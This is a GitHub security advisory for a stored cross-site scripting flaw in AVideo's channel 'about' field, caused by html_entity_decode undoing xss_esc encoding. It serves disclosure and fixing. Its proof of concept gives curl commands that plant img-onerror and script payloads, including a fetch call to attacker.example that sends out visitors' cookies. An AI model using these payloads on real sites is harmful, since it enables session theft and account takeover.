# [M] AVideo vulnerable to Stored XSS via html_entity_decode() Reversing xss_esc() Sanitization in Channel About Field

## Summary
Severity: Medium
Advisory: GHSA-ghx5-7jjg-q2j7
CVE: CVE-2026-33683
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-ghx5-7jjg-q2j7
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

A sanitization order-of-operations flaw in the user profile "about" field allows any registered user to inject arbitrary JavaScript that executes when other users visit their channel page. The `xss_esc()` function entity-encodes input before `strip_specific_tags()` can match dangerous HTML tags, and `html_entity_decode()` on output reverses the encoding, restoring the raw malicious HTML.

## Details

**Input sanitization** in `objects/user.php:156`:

```php
public function setAbout($about)
{
    $this->about = strip_specific_tags(xss_esc($about));
}
```

The call order is `strip_specific_tags(xss_esc($about))`. The inner `xss_esc()` function (`objects/functionsSecurity.php:233`) calls `htmlspecialchars()`:

```php
$result = @htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
```

This encodes `<script>alert(1)</script>` to `&lt;script&gt;alert(1)&lt;/script&gt;`.

Then `strip_specific_tags()` (`objects/functions.php:6623-6636`) runs regex patterns to remove dangerous tags:

```php
$string = preg_replace('/<' . $tag . '[^>]*>(.*?)<\/' . $tag . '>/s', $replacement, $string);
```

But the regex looks for literal `<script>` — it can never match the entity-encoded `&lt;script&gt;`. The sanitizer is completely neutralized by the encoding that precedes it.

**Output** in `view/channelBody.php:239-246`:

```php
$about = html_entity_decode($user->getAbout());
if (!empty($advancedCustomUser->showAllAboutTextOnChannel)) {
    echo $about;
} else {
?>
    <div id="aboutAreaPreContent">
        <div id="aboutAreaContent">
            <?php echo $about; ?>
        </div>
    </div>
```

The `html_entity_decode()` call reverses the `htmlspecialchars()` encoding, restoring the original raw HTML including `<script>` tags. The result is echoed directly into the page without any further escaping.

**Secondary vector:** The `<img>` tag is not in the `strip_specific_tags` blocklist (`['script', 'style', 'iframe', 'object', 'applet', 'link']`), so payloads like `<img src=x onerror=...>` bypass even the intended tag stripping entirely.

The about field is set via `objects/userUpdate.json.php:28`, accessible to any logged-in user:

```php
$user->setAbout($_POST['about']);
```

The channel page (`view/channelBody.php`) is publicly accessible — no authentication is required to view it.

## PoC

**Step 1:** Log in as any registered user and update the "about" field:

```bash
curl -X POST 'https://TARGET/objects/userUpdate.json.php' \
  -H 'Cookie: PHPSESSID=ATTACKER_SESSION' \
  -d 'about=<img src=x onerror=alert(document.cookie)>&user=attacker&pass=password123&email=attacker@example.com&name=Attacker&analyticsCode=&donationLink=&phone='
```

**Step 2:** Any user (including unauthenticated visitors) navigates to the attacker's channel page:

```
https://TARGET/channel/attacker
```

**Expected result:** The JavaScript in the `onerror` handler executes in the visitor's browser, displaying their session cookie.

**Alternative payload using `<script>` tag (also works due to the sanitization bypass):**

```bash
curl -X POST 'https://TARGET/objects/userUpdate.json.php' \
  -H 'Cookie: PHPSESSID=ATTACKER_SESSION' \
  -d 'about=<script>fetch("https://attacker.example/steal?c="%2Bdocument.cookie)</script>&user=attacker&pass=password123&email=attacker@example.com&name=Attacker&analyticsCode=&donationLink=&phone='
```

## Impact

- **Session hijacking:** Attacker can steal session cookies of any user (including administrators) who visits their channel page
- **Account takeover:** Stolen admin session tokens allow full administrative access to the AVideo instance
- **Phishing:** Attacker can inject fake login forms or redirect users to malicious sites
- **Worm potential:** Stored XSS could modify other users' profiles programmatically, creating a self-propagating worm

This is a stored XSS affecting all visitors to any attacker-controlled channel page, with no user interaction beyond navigating to the page.

## Recommended Fix

**Option 1 (Recommended — remove html_entity_decode):** The entity-encoded string is already safe for display. Remove the decode call in `view/channelBody.php`:

```php
// Before (VULNERABLE):
$about = html_entity_decode($user->getAbout());

// After (FIXED):
$about = $user->getAbout();
```

**Option 2 (If rich HTML is intended):** Reverse the sanitization order in `objects/user.php:156` and use a proper sanitizer:

```php
// Before (VULNERABLE):
$this->about = strip_specific_tags(xss_esc($about));

// After (FIXED — strip tags on raw HTML first, then encode):
$this->about = xss_esc(strip_specific_tags($about));
```

**Option 3 (Best — if rich HTML in about is desired):** Replace both `strip_specific_tags()` and `xss_esc()` with HTMLPurifier, which properly handles allowlisted HTML sanitization:

```php
require_once 'vendor/ezyang/htmlpurifier/library/HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,br,b,i,u,a[href],ul,ol,li,strong,em');
$purifier = new HTMLPurifier($config);
$this->about = $purifier->purify($about);
```

And on output, remove `html_entity_decode()` — output the purified HTML directly.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-ghx5-7jjg-q2j7
- https://nvd.nist.gov/vuln/detail/CVE-2026-33683
- https://github.com/WWBN/AVideo/commit/7cfdc380dae1e56bbb5de581470d9e9957445df0
- https://github.com/WWBN/AVideo
